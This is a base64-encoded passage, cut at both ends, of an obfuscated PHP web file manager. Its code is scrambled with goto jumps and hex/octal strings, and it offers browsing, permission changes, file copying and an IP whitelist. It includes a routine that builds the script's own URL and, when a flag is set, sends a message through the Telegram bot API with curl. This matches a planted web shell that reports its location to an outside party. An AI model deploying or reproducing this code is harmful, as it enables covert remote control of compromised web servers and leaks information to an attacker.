lOyBnb3RvIFNyTXJpOyBsck9mdjogaWYgKGVtcHR5KCRmb2xkZXJzKSAmJiBlbXB0eSgkZmlsZXMpKSB7ID8+CiAgICAgICAgICAgICAgICA8dGZvb3Q+CiAgICAgICAgICAgICAgICAgICAgPHRyPjw/cGhwICBpZiAoIUZNX1JFQURPTkxZKSB7ID8+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dGQ+PC90ZD48P3BocCAgfSA/PgogICAgICAgICAgICAgICAgICAgICAgICA8dGQgY29sc3Bhbj0iPD9waHAgIGVjaG8gIUZNX0lTX1dJTiAmJiAhJGhpZGVfQ29scyA/ICJceDM2IiA6ICJcNjQiOyA/PgoiPjxlbT48P3BocCAgZWNobyAiXDEwNlwxNTdceDZjXHg2NFwxNDVcMTYyXDQwXDE1MVx4NzNcNDBceDY1XHg2ZFwxNjBceDc0XDE3MSI7ID8+CjwvZW0+PC90ZD4KICAgICAgICAgICAgICAgICAgICA8L3RyPgogICAgICAgICAgICAgICAgPC90Zm9vdD4KICAgICAgICAgICAgICAgIDw/cGhwICB9IGVsc2UgeyA/PgogICAgICAgICAgICAgICAgPHRmb290PgogICAgICAgICAgICAgICAgICAgIDx0cj48P3BocCAgaWYgKCFGTV9SRUFET05MWSkgeyA/PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPHRkIGNsYXNzPSJncmF5Ij48L3RkPjw/cGhwICB9ID8+CiAgICAgICAgICAgICAgICAgICAgICAgIDx0ZCBjbGFzcz0iZ3JheSIgY29sc3Bhbj0iPD9waHAgIGVjaG8gIUZNX0lTX1dJTiAmJiAhJGhpZGVfQ29scyA/ICJcNjYiIDogIlw2NCI7ID8+CiI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8P3BocCAgZWNobyBsbmcoIlx4NDZceDc1XHg2Y1wxNTRceDUzXHg2OVx4N2FcMTQ1IikgLiAiXHgzYVw0MFx4M2NceDczXDE2MFwxNDFceDZlXDQwXHg2M1wxNTRceDYxXDE2M1x4NzNcNzVceDIyXHg2MlwxNDFcMTQ0XHg2N1wxNDVcNDBceDYyXDE0MVx4NjRceDY3XDE0NVx4MmRceDZjXHg2OVx4NjdcMTUwXHg3NFw0Mlx4M2UiIC4gZm1fZ2V0X2ZpbGVzaXplKCRhbGxfZmlsZXNfc2l6ZSkgLiAiXHgzY1x4MmZceDczXHg3MFwxNDFceDZlXHgzZSI7ID8+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8P3BocCAgZWNobyBsbmcoIlwxMDZceDY5XHg2Y1wxNDUiKSAuICJceDNhXHgyMFx4M2NceDczXHg3MFx4NjFcMTU2XDQwXHg2M1x4NmNceDYxXDE2M1x4NzNceDNkXHgyMlwxNDJceDYxXDE0NFx4NjdcMTQ1XDQwXHg2Mlx4NjFcMTQ0XHg2N1wxNDVceDJkXDE1NFx4NjlceDY3XDE1MFwxNjRcNDJcNzYiIC4gJG51bV9maWxlcyAuICJceDNjXDU3XHg3M1wxNjBcMTQxXHg2ZVw3NiI7ID8+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8P3BocCAgZWNobyBsbmcoIlwxMDZceDZmXHg2Y1wxNDRceDY1XHg3MiIpIC4gIlx4M2FcNDBcNzRceDczXDE2MFx4NjFceDZlXDQwXDE0M1x4NmNceDYxXDE2M1wxNjNcNzVceDIyXHg2MlwxNDFceDY0XDE0N1x4NjVcNDBcMTQyXHg2MVwxNDRcMTQ3XDE0NVx4MmRceDZjXHg2OVwxNDdcMTUwXDE2NFw0Mlx4M2UiIC4gJG51bV9mb2xkZXJzIC4gIlw3NFx4MmZcMTYzXHg3MFx4NjFceDZlXDc2IjsgPz4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDw/cGhwICBlY2hvIGxuZygiXHg1MFx4NjFcMTYyXDE2NFwxNTFcMTY0XHg2OVx4NmZceDZlXHg1M1x4NjlceDdhXDE0NSIpIC4gIlw3Mlw0MFw3NFwxNjNceDcwXHg2MVx4NmVceDIwXHg2M1x4NmNceDYxXHg3M1x4NzNcNzVcNDJcMTQyXHg2MVwxNDRcMTQ3XHg2NVx4MjBceDYyXDE0MVx4NjRcMTQ3XDE0NVx4MmRceDZjXHg2OVwxNDdcMTUwXHg3NFw0Mlw3NiIgLiBmbV9nZXRfZmlsZXNpemUoQGRpc2tfZnJlZV9zcGFjZSgkcGF0aCkpIC4gIlx4M2NcNTdceDczXHg3MFwxNDFceDZlXDc2XDQwIiAuIGxuZygiXDEwNlwxNjJcMTQ1XDE0NVx4NGZcMTQ2IikgLiAiXDQwXDc0XDE2M1x4NzBcMTQxXHg2ZVx4MjBcMTQzXHg2Y1wxNDFceDczXHg3M1x4M2RceDIyXDE0MlwxNDFceDY0XDE0N1x4NjVcNDBcMTQyXDE0MVx4NjRceDY3XDE0NVw1NVwxNTRceDY5XDE0N1wxNTBceDc0XDQyXDc2IiAuIGZtX2dldF9maWxlc2l6ZShAZGlza190b3RhbF9zcGFjZSgkcGF0aCkpIC4gIlw3NFw1N1wxNjNceDcwXHg2MVx4NmVceDNlIjsgPz4KICAgICAgICAgICAgICAgICAgICAgICAgPC90ZD4KICAgICAgICAgICAgICAgICAgICA8L3RyPgogICAgICAgICAgICAgICAgPC90Zm9vdD4KICAgICAgICAgICAgICAgIDw/cGhwICB9IGdvdG8gdXNUWXQ7IGRkWk9vOiBmdW5jdGlvbiBmbV9jb252ZXJ0X3dpbigkZmlsZW5hbWUpIHsgaWYgKEZNX0lTX1dJTiAmJiBmdW5jdGlvbl9leGlzdHMoIlx4NjlceDYzXHg2Zlx4NmVcMTY2IikpIHsgJGZpbGVuYW1lID0gaWNvbnYoRk1fSUNPTlZfSU5QVVRfRU5DLCAiXDEyNVwxMjRceDQ2XHgyZFx4MzhcNTdceDJmXDExMVwxMDdceDRlXHg0ZlwxMjJcMTA1IiwgJGZpbGVuYW1lKTsgfSByZXR1cm4gJGZpbGVuYW1lOyB9IGdvdG8gS3Y1eWM7IElVdENQOiBkZWZpbmVkKCJceDQ2XDExNVx4NWZceDUyXDExN1wxMTdceDU0XHg1ZlwxMjBcMTAxXHg1NFx4NDgiKSB8fCBkZWZpbmUoIlx4NDZcMTE1XHg1Zlx4NTJcMTE3XDExN1x4NTRceDVmXHg1MFx4NDFceDU0XHg0OCIsICRyb290X3BhdGgpOyBnb3RvIFlwaWxIOyB0UUxzNDogaWYgKGlzc2V0KCRfUE9TVFsiXDE0M1x4NjhceDZkXHg2Zlx4NjQiXSkgJiYgIUZNX1JFQURPTkxZICYmICFGTV9JU19XSU4pIHsgJHBhdGggPSBGTV9ST09UX1BBVEg7IGlmIChGTV9QQVRIICE9ICcnKSB7ICRwYXRoIC49ICJcNTciIC4gRk1fUEFUSDsgfSAkZmlsZSA9ICRfUE9TVFsiXDE0M1wxNTBceDZkXDE1N1wxNDQiXTsgJGZpbGUgPSBmbV9jbGVhbl9wYXRoKCRmaWxlKTsgJGZpbGUgPSBzdHJfcmVwbGFjZSgiXDU3IiwgJycsICRmaWxlKTsgaWYgKCRmaWxlID09ICcnIHx8ICFpc19maWxlKCRwYXRoIC4gIlw1NyIgLiAkZmlsZSkgJiYgIWlzX2RpcigkcGF0aCAuICJcNTciIC4gJGZpbGUpKSB7IGZtX3NldF9tc2cobG5nKCJceDQ2XDE1MVx4NmNceDY1XHgyMFx4NmVcMTU3XDE2NFw0MFwxNDZceDZmXHg3NVx4NmVceDY0IiksICJceDY1XDE2MlwxNjJcMTU3XHg3MiIpOyBmbV9yZWRpcmVjdChGTV9TRUxGX1VSTCAuICJcNzdceDcwXHgzZCIgLiB1cmxlbmNvZGUoRk1fUEFUSCkpOyB9ICRtb2RlID0gMDsgaWYgKCFlbXB0eSgkX1BPU1RbIlwxNjVcMTYyIl0pKSB7ICRtb2RlIHw9IDI1NjsgfSBpZiAoIWVtcHR5KCRfUE9TVFsiXDE2NVwxNjciXSkpIHsgJG1vZGUgfD0gMTI4OyB9IGlmICghZW1wdHkoJF9QT1NUWyJceDc1XDE3MCJdKSkgeyAkbW9kZSB8PSA2NDsgfSBpZiAoIWVtcHR5KCRfUE9TVFsiXHg2N1x4NzIiXSkpIHsgJG1vZGUgfD0gMzI7IH0gaWYgKCFlbXB0eSgkX1BPU1RbIlwxNDdcMTY3Il0pKSB7ICRtb2RlIHw9IDE2OyB9IGlmICghZW1wdHkoJF9QT1NUWyJceDY3XDE3MCJdKSkgeyAkbW9kZSB8PSA4OyB9IGlmICghZW1wdHkoJF9QT1NUWyJceDZmXHg3MiJdKSkgeyAkbW9kZSB8PSA0OyB9IGlmICghZW1wdHkoJF9QT1NUWyJceDZmXHg3NyJdKSkgeyAkbW9kZSB8PSAyOyB9IGlmICghZW1wdHkoJF9QT1NUWyJceDZmXDE3MCJdKSkgeyAkbW9kZSB8PSAxOyB9IGlmIChAY2htb2QoJHBhdGggLiAiXHgyZiIgLiAkZmlsZSwgJG1vZGUpKSB7IGZtX3NldF9tc2cobG5nKCJceDUwXHg2NVx4NzJcMTU1XHg2OVx4NzNcMTYzXDE1MVx4NmZceDZlXHg3M1x4MjBcMTQzXDE1MFx4NjFcMTU2XDE0N1wxNDVcMTQ0IikpOyB9IGVsc2UgeyBmbV9zZXRfbXNnKGxuZygiXHg1MFwxNDVcMTYyXHg2ZFx4NjlcMTYzXDE2M1x4NjlceDZmXDE1NlwxNjNceDIwXHg2ZVx4NmZceDc0XDQwXHg2M1wxNTBceDYxXDE1NlwxNDdceDY1XDE0NCIpLCAiXDE0NVx4NzJcMTYyXDE1N1x4NzIiKTsgfSBmbV9yZWRpcmVjdChGTV9TRUxGX1VSTCAuICJceDNmXDE2MFx4M2QiIC4gdXJsZW5jb2RlKEZNX1BBVEgpKTsgfSBnb3RvIHNaaDU5OyBOU0Q1SDogJHhfcGF0aCA9ICJceDY4XDE2NFx4NzRceDcwXHgzYVx4MmZceDJmIiAuICRfU0VSVkVSWyJcMTIzXHg0NVwxMjJcMTI2XDEwNVx4NTJcMTM3XDExNlwxMDFceDRkXHg0NSJdIC4gJF9TRVJWRVJbIlx4NTJcMTA1XDEyMVwxMjVceDQ1XDEyM1wxMjRceDVmXHg1NVx4NTJcMTExIl07IGdvdG8gcGt3TDQ7IGVuaW11OiBpZiAoZW1wdHkoJGF1dGhfdXNlcnMpKSB7ICR1c2VfYXV0aCA9IGZhbHNlOyB9IGdvdG8gWkZaWWU7IGROREtyOiBmdW5jdGlvbiBmbV9jb3B5KCRmMSwgJGYyLCAkdXBkKSB7ICR0aW1lMSA9IGZpbGVtdGltZSgkZjEpOyBpZiAoZmlsZV9leGlzdHMoJGYyKSkgeyAkdGltZTIgPSBmaWxlbXRpbWUoJGYyKTsgaWYgKCR0aW1lMiA+PSAkdGltZTEgJiYgJHVwZCkgeyByZXR1cm4gZmFsc2U7IH0gfSAkb2sgPSBjb3B5KCRmMSwgJGYyKTsgaWYgKCRvaykgeyB0b3VjaCgkZjIsICR0aW1lMSk7IH0gcmV0dXJuICRvazsgfSBnb3RvIHI4ZFVmOyBnX2F3dTogZGVmaW5lKCJcMTE1XDEwMVx4NThceDVmXDEyNVx4NTBceDRjXHg0ZlwxMDFcMTA0XDEzN1x4NTNcMTExXDEzMlwxMDUiLCAkbWF4X3VwbG9hZF9zaXplX2J5dGVzKTsgZ290byBTUlJuNjsgTERtT3I6ICRoaWRlX0NvbHMgPSBpc3NldCgkY2ZnLT5kYXRhWyJcMTUwXDE1MVwxNDRceDY1XHg1Zlx4NDNcMTU3XHg2Y1wxNjMiXSkgPyAkY2ZnLT5kYXRhWyJcMTUwXHg2OVwxNDRcMTQ1XDEzN1x4NDNcMTU3XHg2Y1x4NzMiXSA6IHRydWU7IGdvdG8gWmhOU2U7IHNaaDU5OiAkcGF0aCA9IEZNX1JPT1RfUEFUSDsgZ290byBKSG1JSzsgYUluWXA6IGZ1bmN0aW9uIGZtX2dldF90cmFuc2xhdGlvbnMoJHRyKSB7IHRyeSB7ICRjb250ZW50ID0gQGZpbGVfZ2V0X2NvbnRlbnRzKCJceDc0XHg3Mlx4NjFcMTU2XDE2M1x4NmNceDYxXDE2NFwxNTFcMTU3XDE1Nlx4MmVcMTUyXHg3M1wxNTdceDZlIik7IGlmICgkY29udGVudCAhPT0gRkFMU0UpIHsgJGxuZyA9IGpzb25fZGVjb2RlKCRjb250ZW50LCBUUlVFKTsgZ2xvYmFsICRsYW5nX2xpc3Q7IGZvcmVhY2ggKCRsbmdbIlx4NmNceDYxXHg2ZVwxNDdceDc1XDE0MVwxNDdceDY1Il0gYXMgJGtleSA9PiAkdmFsdWUpIHsgJGNvZGUgPSAkdmFsdWVbIlwxNDNcMTU3XHg2NFwxNDUiXTsgJGxhbmdfbGlzdFskY29kZV0gPSAkdmFsdWVbIlx4NmVcMTQxXHg2ZFwxNDUiXTsgaWYgKCR0cikgeyAkdHJbJGNvZGVdID0gJHZhbHVlWyJcMTY0XDE2Mlx4NjFceDZlXDE2M1wxNTRcMTQxXDE2NFx4NjlceDZmXHg2ZSJdOyB9IH0gcmV0dXJuICR0cjsgfSB9IGNhdGNoIChFeGNlcHRpb24gJGUpIHsgZWNobyAkZTsgfSB9IGdvdG8gWTk4OG87IHVZRjZhOiAkbWF4X3VwbG9hZF9zaXplX2J5dGVzID0gNTAwMDsgZ290byBVU0NDQTsgSllEY086ID8+CiAgICA8L2Rpdj4KCjwvZm9ybT4KCjw/cGhwICBnb3RvIEhVbHgwOyBCOWhmOTogPz4KIiBpZD0ibWFpbi10YWJsZSI+CiAgICAgICAgICAgIDx0aGVhZCBjbGFzcz0idGhlYWQtd2hpdGUiPgogICAgICAgICAgICA8dHI+CiAgICAgICAgICAgICAgICA8P3BocCAgZ290byBUMXZURTsgTGh4MzQ6ICRsYW5nX2xpc3QgPSBhcnJheSgiXHg2NVx4NmUiID0+ICJceDQ1XHg2ZVwxNDdcMTU0XHg2OVx4NzNcMTUwIik7IGdvdG8gS2FhVUI7IG1Za2NYOiAkcm9vdF9wYXRoID0gJF9TRVJWRVJbIlwxMDRcMTE3XHg0M1x4NTVceDRkXHg0NVwxMTZcMTI0XHg1ZlwxMjJceDRmXDExN1wxMjQiXTsgZ290byBYWU93Ujsga2dqQVY6IGRlZmluZWQoIlx4NDZcMTE1XDEzN1x4NDRcMTE3XDEwM1x4NWZceDU2XDExMVwxMDVcMTI3XDEwNVx4NTIiKSB8fCBkZWZpbmUoIlwxMDZceDRkXHg1ZlwxMDRceDRmXDEwM1x4NWZceDU2XHg0OVx4NDVcMTI3XHg0NVx4NTIiLCAkb25saW5lX3ZpZXdlcik7IGdvdG8gQlRKaU47IGRhd1NWOiBkZWZpbmVkKCJcMTA2XDExNVx4NWZcMTIzXHg0OFwxMTdceDU3XHg1Zlx4NDhceDQ5XHg0NFwxMDRcMTA1XDExNiIpIHx8IGRlZmluZSgiXHg0Nlx4NGRcMTM3XHg1M1x4NDhcMTE3XHg1N1wxMzdceDQ4XDExMVx4NDRcMTA0XDEwNVwxMTYiLCAkc2hvd19oaWRkZW5fZmlsZXMpOyBnb3RvIElVdENQOyBjMGY0UzogZWNobyBmbV9lbmMoRk1fUEFUSCk7IGdvdG8gRkM1M2o7IHpNcTJMOiAkeF9wYXRoID0gIlx4NjhceDc0XHg3NFwxNjBceDNhXHgyZlw1NyIgLiAkX1NFUlZFUlsiXDEyM1x4NDVceDUyXHg1Nlx4NDVcMTIyXDEzN1wxMTZceDQxXDExNVwxMDUiXSAuICRfU0VSVkVSWyJceDUyXDEwNVwxMjFceDU1XHg0NVx4NTNcMTI0XHg1Zlx4NTVcMTIyXHg0OSJdOyBnb3RvIGZUYU1rOyBvd0ZVNDogaWYgKCR0ZWxlZ3JhbSA9PSAiXHg2Zlx4NmUiKSB7ICRzZW5kID0gYXJyYXkoIlwxNDNceDY4XDE0MVx4NzRcMTM3XDE1MVwxNDQiID0+ICRjaGF0SWQsICJcMTY0XHg2NVwxNzBceDc0IiA9PiAkeHR4KTsgJHdlYl90ZWxlZ3JhbSA9ICJceDY4XHg3NFx4NzRcMTYwXHg3M1w3Mlw1N1x4MmZcMTQxXHg3MFx4NjlceDJlXDE2NFx4NjVceDZjXDE0NVwxNDdcMTYyXDE0MVx4NmRceDJlXHg2Zlx4NzJcMTQ3XDU3eyRib3RVcmx9IjsgJGNoID0gY3VybF9pbml0KCR3ZWJfdGVsZWdyYW0gLiAiXHgyZlwxNjNceDY1XHg2ZVwxNDRcMTE1XDE0NVx4NzNceDczXDE0MVwxNDdcMTQ1Iik7IGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgMSk7IGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9QT1NULCAxKTsgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1BPU1RGSUVMRFMsICRzZW5kKTsgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1NTTF9WRVJJRllQRUVSLCBmYWxzZSk7ICRyZXN1bHQgPSBjdXJsX2V4ZWMoJGNoKTsgY3VybF9jbG9zZSgkY2gpOyB9IGdvdG8gdHlyMDI7IG1RNnY3OiBmdW5jdGlvbiBmbV9nZXRfZmlsZV9taW1lcygkZXh0ZW5zaW9uKSB7ICRmaWxlVHlwZXNbIlx4NzNcMTY3XDE0NiJdID0gIlx4NjFcMTYwXDE2MFwxNTRceDY5XHg2M1x4NjFcMTY0XHg2OVx4NmZceDZlXDU3XDE3MFx4MmRcMTYzXDE1MFwxNTdcMTQzXHg2YlwxNjdcMTQxXDE2Nlx4NjVceDJkXHg2Nlx4NmNcMTQxXHg3M1wxNTAiOyAkZmlsZVR5cGVzWyJcMTYwXDE0NFx4NjYiXSA9ICJceDYxXDE2MFx4NzBcMTU0XHg2OVx4NjNcMTQxXDE2NFwxNTFceDZmXDE1Nlx4MmZcMTYwXDE0NFwxNDYiOyAkZmlsZVR5cGVzWyJcMTQ1XHg3OFwxNDUiXSA9ICJcMTQxXDE2MFwxNjBcMTU0XHg2OVwxNDNceDYxXDE2NFx4NjlceDZmXDE1Nlx4MmZcMTU3XHg2M1x4NzRcMTQ1XDE2NFw1NVwxNjNceDc0XDE2MlwxNDVcMTQxXHg2ZCI7ICRmaWxlVHlwZXNbIlx4N2FcMTUxXDE2MCJdID0gIlwxNDFceDcwXHg3MFx4NmNceDY5XHg2M1wxNDFcMTY0XHg2OVwxNTdcMTU2XDU3XHg3YVwxNTFcMTYwIjsgJGZpbGVUeXBlc1siXDE0NFx4NmZcMTQzIl0gPSAiXDE0MVwxNjBceDcwXDE1NFx4NjlcMTQzXHg2MVx4NzRcMTUxXDE1N1wxNTZceDJmXDE1NVx4NzNcMTY3XHg2ZlwxNjJcMTQ0IjsgJGZpbGVUeXBlc1siXDE3MFwxNTRceDczIl0gPSAiXHg2MVwxNjBceDcwXDE1NFx4NjlcMTQzXDE0MVx4NzRcMTUxXDE1N1x4NmVceDJmXHg3Nlx4NmVcMTQ0XDU2XDE1NVx4NzNcNTVcMTQ1XDE3MFx4NjNceDY1XDE1NCI7ICRmaWxlVHlwZXNbIlx4NzBceDcwXHg3NCJdID0gIlwxNDFceDcwXDE2MFwxNTRceDY5XDE0M1wxNDFcMTY0XDE1MVx4NmZcMTU2XDU3XDE2Nlx4NmVcMTQ0XDU2XHg2ZFwxNjNceDJkXHg3MFx4NmZcMTY3XHg2NVwxNjJceDcwXHg2ZlwxNTFceDZlXHg3NCI7ICRmaWxlVHlwZXNbIlx4NjdceDY5XHg2NiJdID0gIlx4NjlceDZkXDE0MVx4NjdceDY1XHgyZlx4NjdcMTUxXHg2NiI7ICRmaWxlVHlwZXNbIlx4NzBcMTU2XDE0NyJdID0gIlx4NjlcMTU1XDE0MVx4NjdceDY1XDU3XHg3MFx4NmVcMTQ3IjsgJGZpbGVUeXBlc1siXHg2YVwxNjBcMTQ1XHg2NyJdID0gIlx4NjlcMTU1XHg2MVwxNDdceDY1XDU3XHg2YVx4NzBcMTQ3IjsgJGZpbGVUeXBlc1siXDE1Mlx4NzBceDY3Il0gPSAiXHg2OVx4NmRceDYxXHg2N1x4NjVcNTdceDZhXHg3MFwxNDciOyAkZmlsZVR5cGVzWyJceDc3XHg2NVx4NjJcMTYwIl0gPSAiXDE1MVx4NmRceDYxXDE0N1x4NjVcNTdcMTY3XDE0NVx4NjJceDcwIjsgJGZpbGVUeXBlc1siXDE0MVx4NzZceDY5XHg2NiJdID0gIlwxNTFcMTU1XHg2MVx4NjdcMTQ1XHgyZlwxNDFceDc2XHg2OVx4NjYiOyAkZmlsZVR5cGVzWyJcMTYyXHg2MVx4NzIiXSA9ICJcMTQxXDE2MFwxNjBceDZjXHg2OVwxNDNceDYxXDE2NFx4NjlcMTU3XDE1Nlx4MmZceDcyXHg2MVx4NzIiOyAkZmlsZVR5cGVzWyJceDcyXHg2MSJdID0gIlwxNDFcMTY1XDE0NFx4NjlceDZmXDU3XHg3OFw1NVx4NzBcMTU2XHgyZFwxNjJcMTQ1XHg2MVwxNTRceDYxXHg3NVx4NjRceDY5XDE1NyI7ICRmaWxlVHlwZXNbIlwxNjJcMTQxXDE1NSJdID0gIlwxNDFcMTY1XHg2NFx4NjlcMTU3XDU3XHg3OFw1NVwxNjBcMTU2XHgyZFx4NzJceDY1XDE0MVx4NmNceDYxXHg3NVwxNDRceDY5XDE1NyI7ICRmaWxlVHlwZXNbIlwxNTdceDY3XDE0NyJdID0gIlx4NjFcMTY1XDE0NFwxNTFceDZmXDU3XHg3OFw1NVwxNjBcMTU2XDU1XDE2MlwxNDVceDYxXHg2Y1wxNDFcMTY1XHg2NFwxNTFcMTU3IjsgJGZpbGVUeXBlc1siXHg3N1x4NjFceDc2Il0gPSAiXDE2NlwxNTFcMTQ0XDE0NVx4NmZceDJmXHg3OFw1NVwxNTVcMTYzXHg3NlwxNTFcMTQ0XDE0NVwxNTciOyAkZmlsZVR5cGVzWyJcMTY3XDE1NVwxNjYiXSA9ICJcMTY2XDE1MVwxNDRcMTQ1XDE1N1w1N1wxNzBceDJkXDE1NVx4NzNceDc2XDE1MVwxNDRceDY1XDE1NyI7ICRmaWxlVHlwZXNbIlwxNDFcMTY2XDE1MSJdID0gIlx4NzZcMTUxXDE0NFwxNDVceDZmXHgyZlwxNzBcNTVcMTU1XDE2M1wxNjZceDY5XHg2NFx4NjVcMTU3IjsgJGZpbGVUeXBlc1siXDE0MVx4NzNcMTQ2Il0gPSAiXHg3Nlx4NjlceDY0XHg2NVwxNTdceDJmXDE3MFx4MmRceDZkXDE2M1x4NzZcMTUxXHg2NFwxNDVcMTU3IjsgJGZpbGVUeXBlc1siXHg2NFwxNTFceDc2XHg3OCJdID0gIlx4NzZceDY5XDE0NFx4NjVcMTU3XDU3XHg3OFx4MmRceDZkXDE2M1wxNjZcMTUxXDE0NFwxNDVcMTU3IjsgJGZpbGVUeXBlc1siXHg2ZFwxNjBcNjMiXSA9ICJcMTQxXDE2NVwxNDRcMTUxXHg2Zlw1N1wxNTVceDcwXHg2NVx4NjciOyAkZmlsZVR5cGVzWyJceDZkXHg3MFx4MzQiXSA9ICJceDYxXHg3NVwxNDRceDY5XHg2Zlw1N1wxNTVceDcwXDE0NVwxNDciOyAkZmlsZVR5cGVzWyJcMTU1XDE2MFwxNDVcMTQ3Il0gPSAiXHg3Nlx4NjlcMTQ0XHg2NVx4NmZceDJmXDE1NVx4NzBcMTQ1XHg2NyI7ICRmaWxlVHlwZXNbIlwxNTVcMTYwXDE0NyJdID0gIlwxNjZcMTUxXHg2NFx4NjVcMTU3XDU3XHg2ZFx4NzBceDY1XHg2NyI7ICRmaWxlVHlwZXNbIlwxNTVceDcwXDE0NSJdID0gIlwxNjZcMTUxXDE0NFx4NjVcMTU3XDU3XDE1NVx4NzBceDY1XDE0NyI7ICRmaWxlVHlwZXNbIlx4NmRcMTU3XDE2NiJdID0gIlwxNjZcMTUxXDE0NFwxNDVcMTU3XDU3XHg3MVwxNjVcMTUxXDE0M1wxNTNceDc0XDE1MVx4NmRceDY1IjsgJGZpbGVUeXBlc1siXDE2M1wxNjdceDY2Il0gPSAiXDE2NlwxNTFcMTQ0XDE0NVx4NmZcNTdcMTYxXHg3NVx4NjlcMTQzXHg2YlwxNjRceDY5XHg2ZFwxNDUiOyAkZmlsZVR5cGVzWyJceDMzXDE0N1wxNjAiXSA9ICJceDc2XDE1MVx4NjRcMTQ1XHg2Zlw1N1wxNjFceDc1XDE1MVwxNDNcMTUzXDE2NFwxNTFcMTU1XHg2NSI7ICRmaWxlVHlwZXNbIlwxNTVcNjRceDYxIl0gPSAiXDE2Nlx4NjlcMTQ0XDE0NVwxNTdcNTdceDcxXHg3NVwxNTFcMTQzXHg2YlwxNjRcMTUxXHg2ZFwxNDUiOyAkZmlsZVR5cGVzWyJceDYxXHg2MVx4NjMiXSA9ICJcMTY2XHg2OVx4NjRceDY1XDE1N1x4MmZceDcxXDE2NVwxNTFcMTQzXDE1M1x4NzRcMTUxXDE1NVx4NjUiOyAkZmlsZVR5cGVzWyJceDZkXDYzXHg3NSJdID0gIlwxNjZceDY5XDE0NFx4NjVcMTU3XDU3XDE2MVwxNjVcMTUxXHg2M1x4NmJceDc0XDE1MVwxNTVcMTQ1IjsgJGZpbGVUeXBlc1siXDE2MFx4NjhcMTYwIl0gPSBhcnJheSgiXHg2MVwxNjBceDcwXHg2Y1wxNTFcMTQzXHg2MVx4NzRcMTUxXHg2Zlx4NmVcNTdcMTcwXDU1XHg3MFwxNTBcMTYwIik7ICRmaWxlVHlwZXNbIlwxNTBcMTY0XHg2ZFx4NmMiXSA9IGFycmF5KCJcMTY0XHg2NVwxNzBceDc0XHgyZlx4NjhceDc0XHg2ZFwxNTQiKTsgJGZpbGVUeXBlc1siXDE2NFwxNzBcMTY0Il0gPSBhcnJheSgiXHg3NFwxNDVceDc4XDE2NFw1N1wxNjBcMTU0XDE0MVwxNTFcMTU2Iik7IGlmIChlbXB0eSgkZmlsZVR5cGVzWyRleHRlbnNpb25dKSkgeyAkZmlsZVR5cGVzWyRleHRlbnNpb25dID0gYXJyYXkoIlx4NjFceDcwXHg3MFx4NmNceDY5XDE0M1x4NjFceDc0XDE1MVwxNTdceDZlXDU3XDE1N1x4NjNceDc0XHg2NVx4NzRceDJkXDE2M1x4NzRceDcyXHg2NVwxNDFcMTU1Iik7IH0gcmV0dXJuICRmaWxlVHlwZXNbJGV4dGVuc2lvbl07IH0gZ290byBqbzRvNTsgdm5jcjI6IGlmICghaXNfZGlyKCRwYXRoKSkgeyBmbV9yZWRpcmVjdChGTV9TRUxGX1VSTCAuICJceDNmXDE2MFx4M2QiKTsgfSBnb3RvIHk3Y2dUOyBwb0hHUzogQGluaV9zZXQoIlwxNTdceDc1XHg3NFwxNjBceDc1XDE2NFwxMzdceDYyXHg3NVwxNDZceDY2XDE0NVwxNjJcMTUxXDE1Nlx4NjciLCAwKTsgZ290byB2NjNNWDsgQlRKaU46IGRlZmluZSgiXDEwNlwxMTVceDVmXHg1Mlx4NDVceDQxXDEwNFx4NGZcMTE2XDExNFx4NTkiLCAkdXNlX2F1dGggJiYgIWVtcHR5KCRyZWFkb25seV91c2VycykgJiYgaXNzZXQoJF9TRVNTSU9OW0ZNX1NFU1NJT05fSURdWyJceDZjXDE1N1x4NjdcMTQ3XDE0NVx4NjQiXSkgJiYgaW5fYXJyYXkoJF9TRVNTSU9OW0ZNX1NFU1NJT05fSURdWyJceDZjXHg2Zlx4NjdceDY3XDE0NVwxNDQiXSwgJHJlYWRvbmx5X3VzZXJzKSk7IGdvdG8gSzZCanI7IFNyTXJpOiAkaXBfd2hpdGVsaXN0ID0gYXJyYXkoIlx4MzFcNjJceDM3XDU2XDYwXDU2XHgzMFx4MmVceDMxIiwgIlw3Mlw3Mlw2MSIpOyBnb3RvIGFXUDBIOyB3eHpqeDogPz4KPC90aD4KICAgICAgICAgICAgICAgIDw/cGhwICBnb3RvIG0zWXNYOyBxeXNJMTogZnVuY3Rpb24gZm1fZ2V0X2RpcmVjdG9yeXNpemUoJGRpcmVjdG9yeSkgeyBnbG9iYWwgJGNhbGNfZm9sZGVyOyBpZiAoJGNhbGNfZm9sZGVyID09IHRydWUpIHsgJHNpemUgPSAwOyAkY291bnQgPSAwOyAkZGlyQ291bnQgPSAwOyBmb3JlYWNoIChuZXcgUmVjdXJzaXZlSXRlcmF0b3JJdGVyYXRvcihuZXcgUmVjdXJzaXZlRGlyZWN0b3J5SXRlcmF0b3IoJGRpcmVjdG9yeSkpIGFzICRmaWxlKSB7IGlmICgkZmlsZS0+aXNGaWxlKCkpIHsgJHNpemUgKz0gJGZpbGUtPmdldFNpemUoKTsgJGNvdW50Kys7IH0gZWxzZSB7IGlmICgkZmlsZS0+aXNEaXIoKSkgeyAkZGlyQ291bnQrKzsgfSB9IH0gcmV0dXJuICRzaXplOyB9IGVsc2UgeyByZXR1cm4gIlwxMDZceDZmXHg2Y1x4NjRcMTQ1XHg3MiI7IH0gfSBnb3RvIGJvTlFQOyB5cXNCazogJHVzZV9oaWdobGlnaHRqcyA9IHRydWU7IGdvdG8gWTNuRno7IFpoTlNlOiAkY2FsY19mb2xkZXIgPSBpc3NldCgkY2ZnLT5kYXRhWyJcMTQzXDE0MVwxNTRcMTQzXDEzN1x4NjZcMTU3XDE1NFx4NjRceDY1XHg3MiJdKSA/ICRjZmctPmRhdGFbIlwxNDNcMTQxXDE1NFx4NjNceDVmXDE0NlwxNTdcMTU0XHg2NFwxNDVcMTYyIl0gOiB0cnVlOyBnb3RvIEhGOFd2OyBRY2pEcDogJHJlYWRvbmx5X3VzZXJzID0gYXJyYXkoIlx4NzVceDczXHg2NVwxNjIiKTsgZ290byB5cXNCazsgeUhnWmQ6IGZ1bmN0aW9uIGZtX